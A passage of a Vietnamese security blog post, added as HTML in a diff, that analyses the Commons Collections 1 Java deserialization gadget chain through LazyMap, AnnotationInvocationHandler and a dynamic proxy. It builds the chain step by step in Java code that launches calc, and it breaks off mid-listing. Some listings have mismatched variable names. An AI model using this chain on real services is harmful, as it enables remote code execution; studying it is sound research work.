@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <title>Phân tích chuỗi Commons Collections 1 với LazyMap | Rayinaw</title>
+  <meta name="author" content="Rayinaw" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Commons Collections, Deserialization, Java" />
+  
+  <meta name="description" content="Trong bài viết trước mình đã phân tích lỗ hổng deserialization của TransformMap trong chuỗi CC1, và trong bài viết này mình sẽ thực hiện deserialization theo hướng của lớp LazyMap. Phân tích InvokeTra">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Phân tích chuỗi Commons Collections 1 với LazyMap">
+<meta property="og:url" content="https://rayinaw.github.io/2022/12/15/CommonsCollections1-LazyMap/index.html">
+<meta property="og:site_name" content="Rayinaw">
+<meta property="og:description" content="Trong bài viết trước mình đã phân tích lỗ hổng deserialization của TransformMap trong chuỗi CC1, và trong bài viết này mình sẽ thực hiện deserialization theo hướng của lớp LazyMap. Phân tích InvokeTra">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+<meta property="article:published_time" content="2022-12-14T20:48:35.000Z">
+<meta property="article:modified_time" content="2022-12-15T10:08:24.760Z">
+<meta property="article:author" content="Rayinaw">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Deserialization">
+<meta property="article:tag" content="Commons Collections">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Rayinaw" type="application/atom+xml">
+</head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>Trang chủ</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-book"></i>Kho lưu trữ</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/about/"><i class="fa fa-paper-plane"></i>Về mình</a></li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Rayinaw</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Rayinaw</h2> <br />
+                        <span>Nơi mình ghi chú lại những thứ đã học.</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="https://rayinaw.github.io/2022/12/15/CommonsCollections1-LazyMap/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">Phân tích chuỗi Commons Collections 1 với LazyMap</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2022-12-14T20:48:35.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2022-12-15</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> Tác giả <span itemprop="name">Rayinaw</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~13.88K
+                    
+                    từ
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>Bài viết này được chỉnh sửa lần cuối vào <time datetime="1671098904760"></time> trước, và có thể cần cập nhật。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>Trong bài viết trước mình đã phân tích lỗ hổng deserialization của TransformMap trong chuỗi CC1, và trong bài viết này mình sẽ thực hiện deserialization theo hướng của lớp LazyMap.</p>
+<h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h2><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/mindmap.png"></p>
+<h3 id="InvokeTransformer"><a href="#InvokeTransformer" class="headerlink" title="InvokeTransformer"></a>InvokeTransformer</h3><p>Phần đuôi của chuỗi này cũng tương tự như chuỗi trước là <code>InvokerTransformer</code>, mình sẽ không phân tích lại lớp này. Như bài viết trước đã nói chúng ta cần tìm lớp gọi đến phương thức transform của lớp InvokerTransformer.</p>
+<p><code>Ctrl + Chuột trái</code> click vào phương thức transform</p>
+<p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/ClassesCallMethodTransform.png"></p>
+<p>Phương thức này được sử dụng ở LazyMap.get()</p>
+<p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/Commons-Collections1-TransformedMap/LazyMap-Get.png"></p>
+<p>Xem <code>factory</code> là gì nào~</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Factory method to create a lazily instantiated map.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Lớp này sử dụng Overloading cho hàm tạo và hàm decorate, và ở đây có kiểu truyền vào cho factory là Transformer hoặc Factory, do đó chúng ta có thể truyền vào factory một Transformer rồi cho factory.transform(Runtime.getRuntime) như chain trước.</p>
+<p>Ở bài viết trước, có một vấn đề gặp phải là lớp Runtime không implements serialize và không thể điều khiển được tham số ở trong hàm setValue. Và chúng ta đã thấy được cái tiện lợi của lớp ChainedTransformer và ConstantTransformer. Nên mình sẽ sử dụng lại đoạn này để bỏ đi một vài bước không cần thiết.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        lazyMap.get(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/Commons-Collections1-LazyMap/LazyMap-Get.png"></p>
+<p>Đã mở được máy tính. Tuy nhiên như thế vẫn chưa đủ, chúng ta cần tìm lớp nào gọi đến phương thức LazyMap.get(). Và với chuỗi này, chúng ta sẽ tập trung đến lớp <code>AnnotationInvocationHandler</code>.</p>
+<h3 id="AnnotationInvocationHandler-invoke"><a href="#AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler.invoke()"></a>AnnotationInvocationHandler.invoke()</h3><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/Commons-Collections1-LazyMap/AnnotationInvocationHandler-invoke.png"></p>
+<p>Trong hàm invoke của <code>AnnotationInvocationHandler</code> có dòng thực hiện phương thức get <code>Object var6 = this.memberValues.get(var4);</code>:</p>
+<ul>
+<li><code>this.memberValues</code> ở đây là một map, chúng ta có thể cast nó sang LazyMap để lợi dụng LazyMap.get().</li>
+<li>Như bài viết trước đã nói, lớp này là lớp kiểu default và constructor cũng là default nên chúng ta phải khởi tạo nó bằng Reflection.</li>
+</ul>
+<p>Đoạn code khởi tạo một AnnotationInvocationHandler, chỉ dừng ở việc khởi tạo và mình chưa làm những bước tiếp theo.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//lazyMap.get(null);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Object.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="comment">//InvocationHandler aihObject = (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Lớp này đã implements Serializable và có phương thức readObject(). Nên điều mà chúng ta cần tiếp theo là làm sao để lớp này thực hiện hàm invoke() trong phương thức readObject(). Và để thực hiện điều này chúng ta có thể sử dụng Proxy động.</p>
+<h3 id="Dynamic-Proxy"><a href="#Dynamic-Proxy" class="headerlink" title="Dynamic Proxy"></a>Dynamic Proxy</h3><p>Các phương thức gốc của lớp gốc đã được ghi đè bằng proxy, khi chúng ta thực hiện một phương thức của lớp đó thông qua proxy, proxy sẽ gọi đến hàm invoke rồi invoke phương thức của lớp này. Để hiểu thêm thì các bạn hãy đọc thêm về Dynamic Proxy trong Java.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Tạo một InvocationHandler để điều khiển phương thức của lớp gốc.</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">aihObject</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"><span class="comment">//Tạo một proxyMap để gọi phương thức</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(aihClass.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aihInstance);</span><br></pre></td></tr></table></figure>
+
+<p>Bây giờ khi chúng ta gọi bất kì phương thức nào của proxyMap tương ứng với phương thức của lazyMap, nó sẽ gọi đến phương thức invoke và thực thi lazyMap.get() như mình đã phân tích ở trên.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//lazyMap.get(null);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aihInstance</span> <span class="operator">=</span> (InvocationHandler) 